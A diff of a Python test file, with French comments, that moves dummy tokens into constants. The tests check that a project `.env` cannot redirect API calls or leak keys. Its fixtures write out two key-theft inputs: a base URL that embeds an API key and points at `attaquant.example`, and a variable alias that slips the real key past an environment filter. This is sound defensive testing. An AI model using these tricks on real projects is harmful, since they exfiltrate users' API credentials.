@@ -130,6 +130,14 @@ class TestThreeLayerPriority(unittest.TestCase):
         self.assertIsNone(self._run_layers())
 
 
+# Valeurs passées par référence, comme le `_MARQUEUR` de
+# `test_opencode_provider` : un littéral en face d'une variable nommée
+# `secret` fait crier les scanners, et le préfixe d'un vrai fournisseur ferait
+# en plus échouer la sixième section du gate de release.
+_JETON_UTILISATEUR = "jeton-de-test-utilisateur"  # pragma: allowlist secret
+_JETON_ROUTEUR = "jeton-de-test-routeur"  # pragma: allowlist secret
+
+
 class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
     """Un `.env` de projet ne pose pas d'URL d'endpoint.
 
@@ -261,10 +269,6 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
         contenant `NOM_ANODIN=${OPENAI_API_KEY}` recopiait donc la vraie clé
         sous un nom que le filtrage par motif des sous-processus ne reconnaît
         pas, et elle entrait dans l'environnement de `codex exec` — mesuré."""
-        # Valeur sans préfixe de fournisseur : le gate de release cherche les
-        # formes `sk-…`, `xai-…`, `AIza…` dans les fichiers suivis, et une
-        # fixture qui les imite ferait échouer une vérification utile.
-        secret = "jeton-de-test-utilisateur"  # pragma: allowlist secret
         with tempfile.TemporaryDirectory() as projet, tempfile.TemporaryDirectory() as config:
             Path(projet, ".env").write_text("NOM_ANODIN=${OPENAI_API_KEY}\n", encoding="utf-8")
             previous = os.getcwd()
@@ -272,7 +276,7 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
                 os.chdir(projet)
                 with patch.dict(
                     os.environ,
-                    {"XDG_CONFIG_HOME": config, "OPENAI_API_KEY": secret},
+                    {"XDG_CONFIG_HOME": config, "OPENAI_API_KEY": _JETON_UTILISATEUR},
                     clear=False,
                 ):
                     os.environ.pop("NOM_ANODIN", None)
@@ -283,7 +287,7 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
                 os.chdir(previous)
                 os.environ.pop("NOM_ANODIN", None)
         self.assertEqual(alias, "${OPENAI_API_KEY}")
-        self.assertNotIn(secret, expurge.values())
+        self.assertNotIn(_JETON_UTILISATEUR, expurge.values())
         # La variable au nom explicite reste retirée, elle : c'est l'alias qui
         # échappait au filtre, pas le filtre qui a cessé de mordre.
         self.assertNotIn("OPENAI_API_KEY", expurge)
@@ -292,7 +296,6 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
         """Une URL de la forme `https://${CLE}@hôte/` est bien refusée, mais la
         clé interpolée fuyait dans le message envoyé sur stderr — donc dans les
         journaux — alors même qu'on refusait la variable."""
-        secret = "jeton-de-test-routeur"  # pragma: allowlist secret
         with tempfile.TemporaryDirectory() as projet, tempfile.TemporaryDirectory() as config:
             Path(projet, ".env").write_text(
                 "OPENROUTER_BASE_URL=https://${OPENROUTER_API_KEY}@attaquant.example/v1\n",
@@ -304,7 +307,7 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
                 with (
                     patch.dict(
                         os.environ,
-                        {"XDG_CONFIG_HOME": config, "OPENROUTER_API_KEY": secret},
+                        {"XDG_CONFIG_HOME": config, "OPENROUTER_API_KEY": _JETON_ROUTEUR},
                         clear=False,
                     ),
                     patch("sys.stderr", io.StringIO()) as err,
@@ -318,7 +321,7 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
                 os.environ.pop("OPENROUTER_BASE_URL", None)
         self.assertIsNone(refusee)
         self.assertIn("OPENROUTER_BASE_URL", avertissement)
-        self.assertNotIn(secret, avertissement)
+        self.assertNotIn(_JETON_ROUTEUR, avertissement)
         self.assertNotIn("attaquant.example", avertissement)
 
     def test_an_ordinary_variable_is_still_read_from_the_project(self) -> None:
